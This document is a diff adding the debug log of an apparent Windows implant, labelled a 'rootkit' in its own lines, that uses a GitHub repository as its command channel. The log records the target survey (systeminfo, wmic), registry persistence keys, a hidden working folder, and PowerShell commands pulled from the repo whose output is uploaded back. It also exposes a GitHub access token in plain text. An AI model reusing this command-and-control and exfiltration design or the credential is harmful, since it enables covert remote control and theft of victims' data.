@@ -1,0 +1,162 @@
+Thu Aug 19 13:48:25 2021. Initialisation of the log file.
+
+DEBUG: Thu Aug 19 13:48:25 2021: GithubLogin: hidemepls785
+DEBUG: Thu Aug 19 13:48:25 2021: GithubRepoName: furry-octo-parakeet
+DEBUG: Thu Aug 19 13:48:25 2021: GihubAccessToken: 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
+DEBUG: Thu Aug 19 13:48:25 2021: Rootkit Name: CorepPreprod2
+DEBUG: Thu Aug 19 13:48:25 2021: Rootkit Registry Key: Sensors
+DEBUG: Thu Aug 19 13:48:25 2021: Run Registry Key Name: test
+DEBUG: Thu Aug 19 13:48:25 2021: Adding the actual location of the servant: C:\Windows\SysWOW64\svchost.exe
+DEBUG: Thu Aug 19 13:48:25 2021: The folder list for random folder is not empty. Its size is: 1599
+DEBUG: Thu Aug 19 13:48:25 2021: The random path choosed for this execution is: C:\Users\clean\AppData\Local\Packages\Microsoft.WebpImageExtension_8wekyb3d8bbwe\AppData
+DEBUG: Thu Aug 19 13:48:26 2021: The survey file for this target could not be found. Trying to create it and upload it to the github repo.
+DEBUG: Thu Aug 19 13:48:29 2021: This command will be executed to know systeminfo: systeminfo > C:\Users\clean\AppData\Local\Packages\Microsoft.WebpImageExtension_8wekyb3d8bbwe\AppData\systeminfo.txt
+DEBUG: Thu Aug 19 13:48:42 2021: This command will be executed to know the last reboot time: wmic os get lastBootUpTime > C:\Users\clean\AppData\Local\Packages\Microsoft.WebpImageExtension_8wekyb3d8bbwe\AppData\systeminfo.txt
+DEBUG: Thu Aug 19 13:48:43 2021: Start of the method readFileWindowsApi for the file: C:\Users\clean\AppData\Local\Packages\Microsoft.WebpImageExtension_8wekyb3d8bbwe\AppData\systeminfo.txt
+DEBUG: Thu Aug 19 13:48:43 2021: The file will be read as binary file.
+DEBUG: Thu Aug 19 13:48:43 2021: Unable to have an handle on the file. Last Windows error: 32
+DEBUG: Thu Aug 19 13:48:44 2021: Start of the method readFileWindowsApi for the file: C:\Users\clean\AppData\Local\Packages\Microsoft.WebpImageExtension_8wekyb3d8bbwe\AppData\systeminfo.txt
+DEBUG: Thu Aug 19 13:48:45 2021: The file will be read as binary file.
+DEBUG: Thu Aug 19 13:48:45 2021: Unable to have an handle on the file. Last Windows error: 32
+DEBUG: Thu Aug 19 13:48:47 2021: Start of the method readFileWindowsApi for the file: C:\Users\clean\AppData\Local\Packages\Microsoft.WebpImageExtension_8wekyb3d8bbwe\AppData\systeminfo.txt
+DEBUG: Thu Aug 19 13:48:47 2021: The file will be read as binary file.
+DEBUG: Thu Aug 19 13:48:47 2021: Unable to have an handle on the file. Last Windows error: 32
+DEBUG: Thu Aug 19 13:48:48 2021: Start of the method readFileWindowsApi for the file: C:\Users\clean\AppData\Local\Packages\Microsoft.WebpImageExtension_8wekyb3d8bbwe\AppData\systeminfo.txt
+DEBUG: Thu Aug 19 13:48:48 2021: The file will be read as binary file.
+DEBUG: Thu Aug 19 13:48:48 2021: Unable to have an handle on the file. Last Windows error: 32
+DEBUG: Thu Aug 19 13:48:49 2021: Start of the method readFileWindowsApi for the file: C:\Users\clean\AppData\Local\Packages\Microsoft.WebpImageExtension_8wekyb3d8bbwe\AppData\systeminfo.txt
+DEBUG: Thu Aug 19 13:48:49 2021: The file will be read as binary file.
+DEBUG: Thu Aug 19 13:48:49 2021: Unable to have an handle on the file. Last Windows error: 32
+DEBUG: Thu Aug 19 13:48:50 2021: Start of the method readFileWindowsApi for the file: C:\Users\clean\AppData\Local\Packages\Microsoft.WebpImageExtension_8wekyb3d8bbwe\AppData\systeminfo.txt
+DEBUG: Thu Aug 19 13:48:50 2021: The file will be read as binary file.
+DEBUG: Thu Aug 19 13:48:50 2021: Unable to have an handle on the file. Last Windows error: 32
+DEBUG: Thu Aug 19 13:48:51 2021: Start of the method readFileWindowsApi for the file: C:\Users\clean\AppData\Local\Packages\Microsoft.WebpImageExtension_8wekyb3d8bbwe\AppData\systeminfo.txt
+DEBUG: Thu Aug 19 13:48:51 2021: The file will be read as binary file.
+DEBUG: Thu Aug 19 13:48:51 2021: Unable to have an handle on the file. Last Windows error: 32
+DEBUG: Thu Aug 19 13:48:52 2021: Start of the method readFileWindowsApi for the file: C:\Users\clean\AppData\Local\Packages\Microsoft.WebpImageExtension_8wekyb3d8bbwe\AppData\systeminfo.txt
+DEBUG: Thu Aug 19 13:48:52 2021: The file will be read as binary file.
+DEBUG: Thu Aug 19 13:48:52 2021: Unable to have an handle on the file. Last Windows error: 32
+DEBUG: Thu Aug 19 13:48:53 2021: Start of the method readFileWindowsApi for the file: C:\Users\clean\AppData\Local\Packages\Microsoft.WebpImageExtension_8wekyb3d8bbwe\AppData\systeminfo.txt
+DEBUG: Thu Aug 19 13:48:53 2021: The file will be read as binary file.
+DEBUG: Thu Aug 19 13:48:53 2021: Unable to have an handle on the file. Last Windows error: 32
+DEBUG: Thu Aug 19 13:48:54 2021: Start of the method readFileWindowsApi for the file: C:\Users\clean\AppData\Local\Packages\Microsoft.WebpImageExtension_8wekyb3d8bbwe\AppData\systeminfo.txt
+DEBUG: Thu Aug 19 13:48:54 2021: The file will be read as binary file.
+DEBUG: Thu Aug 19 13:48:54 2021: Unable to have an handle on the file. Last Windows error: 32
+DEBUG: Thu Aug 19 13:48:55 2021: Start of the method writeFileWindowsApi.
+DEBUG: Thu Aug 19 13:48:55 2021: The content size that will be written: 245
+DEBUG: Thu Aug 19 13:48:55 2021: Success to write the content(number of bytes : 245) in the file : C:\Users\clean\AppData\Local\Packages\Microsoft.WebpImageExtension_8wekyb3d8bbwe\AppData\clean-survey.txt
+DEBUG: Thu Aug 19 13:48:55 2021: Start of the method uploadFileToGithubRepo.
+DEBUG: Thu Aug 19 13:48:55 2021: Start of the method readFileWindowsApi for the file: C:\Users\clean\AppData\Local\Packages\Microsoft.WebpImageExtension_8wekyb3d8bbwe\AppData\clean-survey.txt
+DEBUG: Thu Aug 19 13:48:55 2021: The file will be read as binary file.
+DEBUG: Thu Aug 19 13:48:55 2021: The file that will be read weight: 245
+DEBUG: Thu Aug 19 13:48:55 2021: Success to read the binary file. This number of bytes have been read: 246
+DEBUG: Thu Aug 19 13:48:56 2021: The files clean-survey.txt has been uploaded successfully in the github repo
+DEBUG: Thu Aug 19 13:48:56 2021: Success deleting the survey file.
+DEBUG: Thu Aug 19 13:48:56 2021: Start of a new loop to get commands and treat them.
+DEBUG: Thu Aug 19 13:48:56 2021: Start of GithubCommunication::receiveInstructions
+DEBUG: Thu Aug 19 13:48:57 2021: Success to get the instance number of the current instance: rootkit_path1
+DEBUG: Thu Aug 19 13:48:57 2021: Success to check the commands with rootkit_path1
+DEBUG: Thu Aug 19 13:48:57 2021: Getting this command from the github repo: execute_cmd dir C:\Users
+DEBUG: Thu Aug 19 13:48:57 2021: Start to treat the commands sent by the github repo.
+DEBUG: Thu Aug 19 13:48:57 2021: Command received: execute_cmd
+DEBUG: Thu Aug 19 13:48:57 2021: The following command will be executed by powershell: dir C:\Users > C:\Users\clean\AppData\Local\Packages\Microsoft.WebpImageExtension_8wekyb3d8bbwe\AppData\target_command.log
+DEBUG: Thu Aug 19 13:49:07 2021: Unable to find the file target_command.log. Check your command..
+DEBUG: Thu Aug 19 13:49:07 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Thu Aug 19 13:49:07 2021: #####################################################
+
+DEBUG: Thu Aug 19 13:49:07 2021: Start of GithubCommunication::sendResults
+DEBUG: Thu Aug 19 13:49:07 2021: The place of the rootkit has not been found on the json
+DEBUG: Thu Aug 19 13:49:08 2021: Start of a new loop to get commands and treat them.
+DEBUG: Thu Aug 19 13:49:08 2021: Start of GithubCommunication::receiveInstructions
+DEBUG: Thu Aug 19 13:49:08 2021: Success to get the instance number of the current instance: rootkit_path1
+DEBUG: Thu Aug 19 13:49:08 2021: Success to check the commands with rootkit_path1
+DEBUG: Thu Aug 19 13:49:08 2021: Getting this command from the github repo: execute_cmd dir C:\Users
+DEBUG: Thu Aug 19 13:49:09 2021: Start to treat the commands sent by the github repo.
+DEBUG: Thu Aug 19 13:49:09 2021: Command received: execute_cmd
+DEBUG: Thu Aug 19 13:49:09 2021: The following command will be executed by powershell: dir C:\Users > C:\Users\clean\AppData\Local\Packages\Microsoft.WebpImageExtension_8wekyb3d8bbwe\AppData\target_command.log
+DEBUG: Thu Aug 19 13:49:19 2021: The file target_command.log exists, trying to upload it content.
+DEBUG: Thu Aug 19 13:49:19 2021: Start of the method uploadFileToGithubRepo.
+DEBUG: Thu Aug 19 13:49:19 2021: Start of the method readFileWindowsApi for the file: C:\Users\clean\AppData\Local\Packages\Microsoft.WebpImageExtension_8wekyb3d8bbwe\AppData\target_command.log
+DEBUG: Thu Aug 19 13:49:19 2021: The file will be read as binary file.
+DEBUG: Thu Aug 19 13:49:19 2021: The file that will be read weight: 1044
+DEBUG: Thu Aug 19 13:49:19 2021: Success to read the binary file. This number of bytes have been read: 1045
+DEBUG: Thu Aug 19 13:49:20 2021: The files C:\Users\clean\AppData\Local\Packages\Microsoft.WebpImageExtension_8wekyb3d8bbwe\AppData\target_command.log has been uploaded successfully in the github repo
+DEBUG: Thu Aug 19 13:49:20 2021: Success to delete the file that contains the output of the command.
+DEBUG: Thu Aug 19 13:49:20 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Thu Aug 19 13:49:20 2021: #####################################################
+
+DEBUG: Thu Aug 19 13:49:20 2021: Start of GithubCommunication::sendResults
+DEBUG: Thu Aug 19 13:49:20 2021: The place of the rootkit has not been found on the json
+DEBUG: Thu Aug 19 13:49:20 2021: Start of a new loop to get commands and treat them.
+DEBUG: Thu Aug 19 13:49:20 2021: Start of GithubCommunication::receiveInstructions
+DEBUG: Thu Aug 19 13:49:21 2021: Success to get the instance number of the current instance: rootkit_path1
+DEBUG: Thu Aug 19 13:49:21 2021: Success to check the commands with rootkit_path1
+DEBUG: Thu Aug 19 13:49:21 2021: Getting this command from the github repo: execute_cmd dir C:\Users
+DEBUG: Thu Aug 19 13:49:21 2021: Start to treat the commands sent by the github repo.
+DEBUG: Thu Aug 19 13:49:21 2021: Command received: execute_cmd
+DEBUG: Thu Aug 19 13:49:21 2021: The following command will be executed by powershell: dir C:\Users > C:\Users\clean\AppData\Local\Packages\Microsoft.WebpImageExtension_8wekyb3d8bbwe\AppData\target_command.log
+DEBUG: Thu Aug 19 13:49:31 2021: The file target_command.log exists, trying to upload it content.
+DEBUG: Thu Aug 19 13:49:31 2021: Start of the method uploadFileToGithubRepo.
+DEBUG: Thu Aug 19 13:49:31 2021: Start of the method readFileWindowsApi for the file: C:\Users\clean\AppData\Local\Packages\Microsoft.WebpImageExtension_8wekyb3d8bbwe\AppData\target_command.log
+DEBUG: Thu Aug 19 13:49:31 2021: The file will be read as binary file.
+DEBUG: Thu Aug 19 13:49:31 2021: The file that will be read weight: 1044
+DEBUG: Thu Aug 19 13:49:31 2021: Success to read the binary file. This number of bytes have been read: 1045
+DEBUG: Thu Aug 19 13:49:32 2021: The files C:\Users\clean\AppData\Local\Packages\Microsoft.WebpImageExtension_8wekyb3d8bbwe\AppData\target_command.log has not been uploaded in the github repo with the name: C:\Users\clean\AppData\Local\Packages\Microsoft.WebpImageExtension_8wekyb3d8bbwe\AppData\target_command.log. Here is the answer of the api : {
+  "message": "C:\\Users\\clean\\AppData\\Local\\Packages\\Microsoft.WebpImageExtension_8wekyb3d8bbwe\\AppData\\target_command.log does not match ",
+  "documentation_url": "https://docs.github.com/rest/reference/repos#create-or-update-file-contents"
+}
+
+DEBUG: Thu Aug 19 13:49:32 2021: Url: https://api.github.com/repos/hidemepls785/furry-octo-parakeet/contents/C:\Users\clean\AppData\Local\Packages\Microsoft.WebpImageExtension_8wekyb3d8bbwe\AppData\target_command.log credentials: hidemepls785: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
+DEBUG: Thu Aug 19 13:49:32 2021: Success to delete the file that contains the output of the command.
+DEBUG: Thu Aug 19 13:49:32 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Thu Aug 19 13:49:32 2021: #####################################################
+
+DEBUG: Thu Aug 19 13:49:32 2021: Start of GithubCommunication::sendResults
+DEBUG: Thu Aug 19 13:49:32 2021: The place of the rootkit has not been found on the json
+DEBUG: Thu Aug 19 13:49:33 2021: Start of a new loop to get commands and treat them.
+DEBUG: Thu Aug 19 13:49:33 2021: Start of GithubCommunication::receiveInstructions
+DEBUG: Thu Aug 19 13:49:33 2021: Success to get the instance number of the current instance: rootkit_path1
+DEBUG: Thu Aug 19 13:49:33 2021: Success to check the commands with rootkit_path1
+DEBUG: Thu Aug 19 13:49:33 2021: Getting this command from the github repo: execute_cmd dir C:\Users
+DEBUG: Thu Aug 19 13:49:33 2021: Start to treat the commands sent by the github repo.
+DEBUG: Thu Aug 19 13:49:33 2021: Command received: execute_cmd
+DEBUG: Thu Aug 19 13:49:33 2021: The following command will be executed by powershell: dir C:\Users > C:\Users\clean\AppData\Local\Packages\Microsoft.WebpImageExtension_8wekyb3d8bbwe\AppData\target_command.log
+DEBUG: Thu Aug 19 13:49:44 2021: The file target_command.log exists, trying to upload it content.
+DEBUG: Thu Aug 19 13:49:44 2021: Start of the method uploadFileToGithubRepo.
+DEBUG: Thu Aug 19 13:49:44 2021: Start of the method readFileWindowsApi for the file: C:\Users\clean\AppData\Local\Packages\Microsoft.WebpImageExtension_8wekyb3d8bbwe\AppData\target_command.log
+DEBUG: Thu Aug 19 13:49:44 2021: The file will be read as binary file.
+DEBUG: Thu Aug 19 13:49:44 2021: The file that will be read weight: 1044
+DEBUG: Thu Aug 19 13:49:44 2021: Success to read the binary file. This number of bytes have been read: 1045
+DEBUG: Thu Aug 19 13:49:45 2021: The files C:\Users\clean\AppData\Local\Packages\Microsoft.WebpImageExtension_8wekyb3d8bbwe\AppData\target_command.log has not been uploaded in the github repo with the name: C:\Users\clean\AppData\Local\Packages\Microsoft.WebpImageExtension_8wekyb3d8bbwe\AppData\target_command.log. Here is the answer of the api : {
+  "message": "C:\\Users\\clean\\AppData\\Local\\Packages\\Microsoft.WebpImageExtension_8wekyb3d8bbwe\\AppData\\target_command.log does not match ",
+  "documentation_url": "https://docs.github.com/rest/reference/repos#create-or-update-file-contents"
+}
+
+DEBUG: Thu Aug 19 13:49:45 2021: Url: https://api.github.com/repos/hidemepls785/furry-octo-parakeet/contents/C:\Users\clean\AppData\Local\Packages\Microsoft.WebpImageExtension_8wekyb3d8bbwe\AppData\target_command.log credentials: hidemepls785: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
+DEBUG: Thu Aug 19 13:49:46 2021: Success to delete the file that contains the output of the command.
+DEBUG: Thu Aug 19 13:49:46 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Thu Aug 19 13:49:46 2021: #####################################################
+
+DEBUG: Thu Aug 19 13:49:46 2021: Start of GithubCommunication::sendResults
+DEBUG: Thu Aug 19 13:49:47 2021: The place of the rootkit has not been found on the json
+DEBUG: Thu Aug 19 13:49:47 2021: Start of a new loop to get commands and treat them.
+DEBUG: Thu Aug 19 13:49:47 2021: Start of GithubCommunication::receiveInstructions
+DEBUG: Thu Aug 19 13:49:48 2021: Success to get the instance number of the current instance: rootkit_path1
+DEBUG: Thu Aug 19 13:49:48 2021: Success to check the commands with rootkit_path1
+DEBUG: Thu Aug 19 13:49:48 2021: Getting this command from the github repo: execute_cmd dir C:\Users
+DEBUG: Thu Aug 19 13:49:48 2021: Start to treat the commands sent by the github repo.
+DEBUG: Thu Aug 19 13:49:48 2021: Command received: execute_cmd
+DEBUG: Thu Aug 19 13:49:48 2021: The following command will be executed by powershell: dir C:\Users > C:\Users\clean\AppData\Local\Packages\Microsoft.WebpImageExtension_8wekyb3d8bbwe\AppData\target_command.log
+DEBUG: Thu Aug 19 13:49:58 2021: The file target_command.log exists, trying to upload it content.
+DEBUG: Thu Aug 19 13:49:58 2021: Start of the method uploadFileToGithubRepo.
+DEBUG: Thu Aug 19 13:49:58 2021: Start of the method readFileWindowsApi for the file: C:\Users\clean\AppData\Local\Packages\Microsoft.WebpImageExtension_8wekyb3d8bbwe\AppData\target_command.log
+DEBUG: Thu Aug 19 13:49:58 2021: The file will be read as binary file.
+DEBUG: Thu Aug 19 13:49:58 2021: Unable to have an handle on the file. Last Windows error: 32
+DEBUG: Thu Aug 19 13:49:58 2021: There is no content returning by readFileWindowsApi. Aborting..
+DEBUG: Thu Aug 19 13:49:58 2021: Unable to delete the file that contains the output of the command.
+DEBUG: Thu Aug 19 13:49:58 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Thu Aug 19 13:49:58 2021: #####################################################
+
+DEBUG: Thu Aug 19 13:49:58 2021: Start of GithubCommunication::sendResults
+DEBUG: Thu Aug 19 13:49:58 2021: The place of the rootkit has not been found on the json
+DEBUG: Thu Aug 19 13:49:58 2021: Start of GithubCommunication::sendLogs
